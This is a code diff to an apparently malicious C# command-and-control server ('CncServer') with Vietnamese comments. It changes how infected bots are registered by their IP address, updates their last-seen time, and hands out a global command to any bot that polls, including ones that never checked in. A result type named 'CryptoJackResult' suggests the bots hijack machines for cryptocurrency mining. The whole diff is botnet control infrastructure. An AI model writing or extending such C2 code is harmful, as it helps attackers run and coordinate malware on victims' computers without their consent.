@@ -36,23 +36,38 @@ namespace CncServer.Controllers
         private static string _command = "idle";
         private static readonly ConcurrentBag<CryptoJackResult> _results = new ConcurrentBag<CryptoJackResult>();
 
+        // Hàm helper để lấy IP của Bot
+        private string GetBotIp()
+        {
+            return HttpContext.Connection.RemoteIpAddress?.ToString() ?? "Unknown";
+        }
+
         [HttpPost("checkin")]
         public IActionResult CheckIn([FromBody] BotInfo botInfo)
         {
+            // Tự động gán BotId bằng IP của người gửi request
+            string ip = GetBotIp();
+
+            botInfo.BotId = ip;
             botInfo.LastSeen = DateTime.UtcNow;
-            _bots[botInfo.BotId] = botInfo;
-            //Console.WriteLine($"[+] Bot {botInfo.BotId} checked in. Status: {botInfo.Status}. Total bots: {_bots.Count}");
+
+            _bots[ip] = botInfo;
             return Ok();
         }
 
         [HttpGet("getcommand")]
-        public IActionResult GetCommand(string botId)
+        public IActionResult GetCommand()
         {
-            if (_bots.ContainsKey(botId))
+            string ip = GetBotIp();
+
+            if (_bots.ContainsKey(ip))
             {
+                // Cập nhật last seen khi bot hỏi lệnh
+                _bots[ip].LastSeen = DateTime.UtcNow;
                 return Ok(new { command = _command });
             }
-            return NotFound();
+            // Nếu bot chưa checkin mà hỏi lệnh, bắt nó checkin trước (hoặc vẫn trả lệnh default)
+            return Ok(new { command = _command });
         }
 
         // === NÂNG CẤP: Nhận một model JSON thay vì chuỗi thô ===
